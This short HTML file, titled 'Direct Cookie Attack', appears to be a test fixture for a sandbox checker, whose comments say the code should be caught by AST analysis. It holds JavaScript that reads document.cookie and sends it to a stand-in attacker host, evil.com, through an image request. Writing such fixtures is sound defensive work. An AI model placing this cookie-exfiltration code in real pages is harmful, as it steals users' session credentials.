<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Direct Cookie Attack</title>
</head>
<body>
  <!-- Attack: Cookie access violates L1 sandbox boundary -->

    // This should be caught by AST analysis - document.cookie is banned
    const cookies = document.cookie;
    // Exfiltrate to attacker
    const img = new Image();
    img.src = 'https://evil.com/steal?c=' + encodeURIComponent(cookies);
